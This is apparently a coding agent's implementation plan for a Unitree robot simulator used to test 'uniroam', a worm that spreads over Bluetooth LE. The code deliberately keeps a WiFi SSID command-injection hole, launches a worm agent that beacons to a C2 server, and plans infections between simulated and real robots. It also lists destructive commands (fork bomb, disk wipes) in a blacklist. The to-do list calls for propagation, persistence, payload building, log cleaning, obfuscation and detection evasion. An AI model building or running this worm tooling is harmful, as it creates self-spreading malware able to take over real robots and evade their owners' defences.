<!-- 6e95adbb-f2df-4b44-a0a2-1c2d0d1d3938 9907234d-d699-4070-b104-66ec5663dbda -->
# Robot Simulator System for Worm Testing

## Overview

Create a comprehensive robot simulation framework that emulates vulnerable Unitree robots for testing worm propagation in controlled environments. Supports both virtualized (multiple simulators on one machine) and distributed (across Raspberry Pis, laptops, etc.) deployment.

## Architecture

### Core Components

1. **Robot Simulator Core** (`robot_simulator.py`)

   - Emulates complete Unitree BLE protocol stack
   - Implements vulnerable command execution in sandboxed environment
   - Can receive, execute, and propagate the worm
   - Supports Docker/chroot isolation for safety

2. **Virtual BLE Backend** (`virtual_ble.py`)

   - Software-based BLE emulation for single-device testing
   - Manages multiple virtual robots with unique MAC addresses
   - In-memory message passing between virtual BLE devices
   - No hardware BLE adapter required

3. **Distributed Coordinator** (`sim_coordinator.py`)

   - Orchestrates multiple simulators across network
   - Centralizes configuration and monitoring
   - Synchronizes simulator state
   - Collects propagation metrics

4. **C2 Dashboard Integration**

   - Tag simulators vs real robots in database
   - Visual differentiation in web UI
   - Real-time propagation graph
   - Infection chain visualization

## Implementation Plan

### Phase 1: Core Simulator

**File**: `robot_simulator.py`

Implement realistic robot emulation:

```python
class UnitreeSimulator:
    def __init__(self, model="Go2", serial="SIM_001", mode="virtual"):
        # BLE service emulation
        self.ble_service = VirtualBLEService(
            service_uuid=config.UNITREE_SERVICE_UUID,
            notify_uuid=config.NOTIFY_CHAR_UUID,
            write_uuid=config.WRITE_CHAR_UUID
        )
        
        # Vulnerability state
        self.is_infected = False
        self.worm_process = None
        
        # Sandbox environment
        self.sandbox = CommandSandbox(
            allow_network=True,
            allow_filesystem=True,
            root_path=f"/tmp/robot_sim_{serial}"
        )
    
    async def handle_ble_write(self, data):
        # Decrypt packet (using real AES key/IV)
        decrypted = decrypt_data(data)
        
        # Parse instruction
        instruction = decrypted[2]
        
        if instruction == 1:  # Handshake
            return self.send_handshake_response()
        elif instruction == 2:  # Serial number
            return self.send_serial_chunks()
        elif instruction == 3:  # WiFi config (VULNERABLE)
            return self.execute_wifi_command(decrypted)
    
    def execute_wifi_command(self, packet):
        # Extract command (with injection vulnerability)
        ssid = extract_ssid(packet)
        
        # Execute in sandbox (allows injection!)
        cmd = f'wpa_supplicant -c {ssid}'
        result = self.sandbox.execute(cmd)
        
        # If infected, spawn worm agent
        if "python3" in cmd and not self.is_infected:
            self.spawn_worm_agent()
        
        return create_success_response()
    
    def spawn_worm_agent(self):
        # Actually run the worm in sandbox
        self.worm_process = subprocess.Popen(
            ["python3", "-m", "uniroam.worm_agent",
             "--c2-url", config.get_c2_url(),
             "--robot-id", self.serial],
            cwd=self.sandbox.root_path,
            env=self.sandbox.env
        )
        self.is_infected = True
```

**Sandboxing approach**:

- Use Docker containers (preferred) or Python `chroot` + namespaces
- Restrict filesystem to `/tmp/robot_sim_{serial}/`
- Allow network access for C2 beaconing
- Log all commands executed

### Phase 2: Virtual BLE Backend

**File**: `virtual_ble.py`

Emulate BLE communication without hardware:

```python
class VirtualBLEAdapter:
    """Software BLE adapter for multi-robot simulation on one device"""
    
    def __init__(self):
        self.devices = {}  # MAC -> VirtualDevice
        self.scan_callbacks = []
    
    def create_device(self, name, mac_address):
        device = VirtualBLEDevice(name, mac_address)
        self.devices[mac_address] = device
        return device
    
    async def scan(self, timeout=10.0):
        # Return all registered virtual devices
        advertisements = []
        for mac, device in self.devices.items():
            adv = BLEAdvertisement(
                name=device.name,
                address=mac,
                rssi=-50,  # Simulated signal strength
                service_uuids=[config.UNITREE_SERVICE_UUID]
            )
            advertisements.append(adv)
        return advertisements
    
    async def connect(self, address):
        device = self.devices.get(address)
        if device:
            return VirtualBLEConnection(device)
        raise ConnectionError("Device not found")

class VirtualBLEDevice:
    def __init__(self, name, mac_address):
        self.name = name
        self.address = mac_address
        self.characteristics = {
            config.NOTIFY_CHAR_UUID: bytearray(),
            config.WRITE_CHAR_UUID: bytearray()
        }
        self.notification_callbacks = []
    
    async def write_characteristic(self, uuid, data):
        # Forward to simulator for processing
        response = await self.simulator.handle_ble_write(data)
        
        # Trigger notification callback with response
        for callback in self.notification_callbacks:
            await callback(uuid, response)
```

**Integration with Bleak**:

- Monkey-patch Bleak's scanner/client for virtual mode
- Transparent to worm agent (thinks it's real BLE)
- Switch between real/virtual with environment variable

### Phase 3: Distributed Mode

**File**: `sim_coordinator.py`

Coordinate simulators across multiple physical devices:

```python
class SimulatorCoordinator:
    """Central coordinator for distributed simulator network"""
    
    def __init__(self, c2_url):
        self.simulators = []  # Registered sim instances
        self.c2_url = c2_url
        self.metrics = SimulationMetrics()
    
    async def register_simulator(self, host, port, robot_info):
        # Add simulator node to network
        sim = {
            "host": host,
            "port": port,
            "robot_id": robot_info["serial"],
            "model": robot_info["model"],
            "status": "ready"
        }
        self.simulators.append(sim)
    
    async def start_simulation(self, config):
        # Deploy simulators across network
        for sim in self.simulators:
            await self.rpc_call(sim, "start", config)
        
        # Enable BLE advertising
        for sim in self.simulators:
            await self.rpc_call(sim, "advertise", True)
    
    async def infect_patient_zero(self, target_serial):
        # Manually infect first robot to start chain
        target = self.find_simulator(target_serial)
        await self.rpc_call(target, "force_infect")
    
    def get_propagation_graph(self):
        # Query C2 database for infection chain
        # Return graph visualization data
        pass
```

**Deployment scripts**:

Create `deploy_sim_pi.sh` for Raspberry Pi deployment:

```bash
#!/bin/bash
# Deploy simulator on Raspberry Pi

# Install dependencies
sudo apt-get install -y python3-pip bluetooth bluez
pip3 install -r requirements.txt

# Start simulator as systemd service
sudo cp robot_simulator.service /etc/systemd/system/
sudo systemctl enable robot_simulator
sudo systemctl start robot_simulator
```

### Phase 4: C2 Dashboard Integration

**Modify**: `uniroam/c2_server.py`

Extend database schema to tag simulators:

```python
# Add to create_tables()
cursor.execute("""
    ALTER TABLE devices ADD COLUMN is_simulator BOOLEAN DEFAULT 0;
    ALTER TABLE devices ADD COLUMN simulator_host TEXT;
""")

# Modify beacon endpoint
@app.post("/api/v1/beacon")
async def beacon(beacon_data: BeaconData):
    # Detect simulator robots by ID prefix
    is_sim = beacon_data.robot_id.startswith("SIM_")
    
    # Store with simulator flag
    db.store_beacon(
        robot_id=beacon_data.robot_id,
        is_simulator=is_sim,
        ...
    )
```

**Update dashboard HTML**:

Add visual differentiation for simulators:

```javascript
// In dashboard()
function renderRobotList(robots) {
    robots.forEach(robot => {
        const icon = robot.is_simulator ? '🤖' : '🦿';
        const cssClass = robot.is_simulator ? 'simulator' : 'real';
        
        html += `<div class="robot-card ${cssClass}">
            <span>${icon}</span>
            <strong>${robot.robot_id}</strong>
            ...
        </div>`;
    });
}
```

Add CSS styles:

```css
.robot-card.simulator {
    border-left: 4px solid #00ff00;
    background: rgba(0, 255, 0, 0.05);
}
```

**Infection graph visualization**:

Add D3.js network graph showing propagation chain:

```javascript
function renderPropagationGraph(infections) {
    const nodes = infections.map(i => ({
        id: i.robot_id,
        type: i.is_simulator ? 'sim' : 'real'
    }));
    
    const links = infections.map(i => ({
        source: i.infected_by,
        target: i.robot_id
    }));
    
    // Render with D3 force-directed graph
}
```

### Phase 5: Launcher Scripts

**File**: `run_virtual_sim.py`

Launch multiple virtual robots on one machine:

```python
#!/usr/bin/env python3
"""Launch virtual robot simulator environment"""

import asyncio
from robot_simulator import UnitreeSimulator
from virtual_ble import VirtualBLEAdapter

async def main():
    adapter = VirtualBLEAdapter()
    
    # Create 10 virtual robots
    simulators = []
    for i in range(10):
        sim = UnitreeSimulator(
            model=random.choice(["Go2", "G1", "B2"]),
            serial=f"SIM_{i:03d}",
            mode="virtual"
        )
        sim.attach_ble(adapter)
        simulators.append(sim)
    
    # Start all simulators
    await asyncio.gather(*[s.run() for s in simulators])

if __name__ == "__main__":
    asyncio.run(main())
```

**File**: `run_distributed_sim.py`

Deploy across Raspberry Pis/laptops:

```python
#!/usr/bin/env python3
"""Deploy distributed simulator network"""

from sim_coordinator import SimulatorCoordinator

async def main():
    coordinator = SimulatorCoordinator("http://your-c2-server:8443")
    
    # Define your physical devices
    devices = [
        {"host": "192.168.1.101", "port": 5555},  # RPi 1
        {"host": "192.168.1.102", "port": 5555},  # RPi 2
        {"host": "192.168.1.103", "port": 5555"},  # Laptop
    ]
    
    # Deploy simulators
    for device in devices:
        await coordinator.deploy_simulator(
            host=device["host"],
            model="Go2",
            real_ble=True  # Use actual BLE hardware
        )
    
    # Start simulation
    await coordinator.start_simulation()
    
    # Infect patient zero
    await coordinator.infect_patient_zero("SIM_001")

if __name__ == "__main__":
    asyncio.run(main())
```

### Phase 6: Configuration

**Add to**: `uniroam/config.py`

```python
# Simulator configuration
SIMULATOR_MODE = os.getenv("SIMULATOR_MODE", "disabled")  # virtual, distributed, disabled
SIMULATOR_COUNT = int(os.getenv("SIMULATOR_COUNT", "5"))
SIMULATOR_DOCKER_IMAGE = "uniroam-simulator:latest"
SIMULATOR_COORDINATOR_PORT = 9000

# Sandbox settings
SANDBOX_TYPE = "docker"  # docker, chroot, none
SANDBOX_ALLOW_NETWORK = True
SANDBOX_ALLOW_PROPAGATION = True  # Let sims infect each other

# Simulator identification
SIMULATOR_ID_PREFIX = "SIM_"
SIMULATOR_MODELS = ["Go2_SIM", "G1_SIM", "B2_SIM"]
```

### Phase 7: Safety Features

**File**: `command_sandbox.py`

Implement safe command execution:

```python
class CommandSandbox:
    """Sandbox for executing worm commands safely"""
    
    def __init__(self, root_path, allow_network=True):
        self.root_path = root_path
        self.allow_network = allow_network
        
        # Create isolated filesystem
        os.makedirs(root_path, exist_ok=True)
        
        # Blacklist dangerous commands
        self.blacklist = [
            "rm -rf /",
            "mkfs",
            "dd if=/dev/zero",
            ":(){ :|:& };:",  # Fork bomb
        ]
    
    def execute(self, command):
        # Check blacklist
        if any(danger in command for danger in self.blacklist):
            raise SecurityError("Blocked dangerous command")
        
        # Use Docker for isolation
        if SANDBOX_TYPE == "docker":
            return self._execute_docker(command)
        else:
            return self._execute_subprocess(command)
    
    def _execute_docker(self, command):
        # Run in Docker container
        result = subprocess.run([
            "docker", "run", "--rm",
            "--network", "host" if self.allow_network else "none",
            "-v", f"{self.root_path}:/workspace",
            "uniroam-simulator",
            "bash", "-c", command
        ], capture_output=True, timeout=30)
        
        return result.stdout.decode()
```

## Testing Scenarios

### Scenario 1: Virtual Swarm (Single Device)

```bash
# Launch 20 virtual robots on your laptop
export SIMULATOR_MODE=virtual
export SIMULATOR_COUNT=20
python run_virtual_sim.py

# Start C2
python run_c2.py

# Infect first robot
python -c "from sim_coordinator import infect; infect('SIM_001')"

# Watch propagation in dashboard
# http://localhost:8443/
```

### Scenario 2: Distributed Lab (RPi + Laptops)

```bash
# On each device, start simulator daemon
python robot_simulator.py --mode distributed --coordinator 192.168.1.100:9000

# On coordinator machine
python run_distributed_sim.py

# Monitor via C2 dashboard
```

### Scenario 3: Hybrid (1 Real + N Simulated)

```bash
# Simulators visible to real robot via BLE
# Test real→sim and sim→real infections
```

## Deliverables

New files:

- `robot_simulator.py` - Core simulator (400 lines)
- `virtual_ble.py` - Virtual BLE backend (300 lines)
- `sim_coordinator.py` - Distributed coordinator (250 lines)
- `command_sandbox.py` - Safe execution (150 lines)
- `run_virtual_sim.py` - Virtual launcher (100 lines)
- `run_distributed_sim.py` - Distributed launcher (150 lines)
- `deploy_sim_pi.sh` - RPi deployment script
- `Dockerfile.simulator` - Docker image for sandboxing

Modified files:

- `uniroam/c2_server.py` - Add simulator tagging, graph viz
- `uniroam/config.py` - Add simulator config options

Documentation:

- `docs/SIMULATOR_GUIDE.md` - Complete usage guide

## Key Features

1. **Realistic Protocol Emulation**

   - Full BLE service/characteristic implementation
   - Proper AES encryption/decryption
   - Chunked serial number responses
   - Vulnerable command injection

2. **True Propagation**

   - Simulators actually run worm agent
   - Can infect each other via BLE/WiFi
   - Reports to real C2 server
   - Follows same infection logic as real robots

3. **Flexible Deployment**

   - Virtual: 10-50 robots on one laptop
   - Distributed: Scale across Raspberry Pis
   - Hybrid: Mix real and simulated

4. **Safety**

   - Docker/chroot sandboxing
   - Command blacklisting
   - Isolated filesystems
   - Network restrictions

5. **Observability**

   - C2 dashboard integration
   - Propagation graph visualization
   - Real-time infection tracking
   - Performance metrics

This system will let you thoroughly test worm propagation dynamics, infection rates, C2 resilience, and detection evasion without needing a fleet of real robots.

### To-dos

- [ ] Build worm_agent.py with infection, propagation, and C2 communication modules
- [ ] Create c2_server.py with API, database, and command queue system
- [ ] Implement BLE-based robot-to-robot infection in propagation_engine.py
- [ ] Add WiFi network propagation capabilities with network enumeration
- [ ] Develop persistence.py with systemd, cron, and watchdog implementations
- [ ] Create payload_builder.py for multi-stage infection delivery
- [ ] Build web dashboard for infection monitoring and control
- [ ] Implement OpSec features: encryption, obfuscation, log cleaning
- [ ] Refactor unitree_hack.py into reusable library functions
- [ ] Create controlled test environment and benchmarking suite
- [ ] Document attack chain, IOCs, and deployment procedures for defensive analysis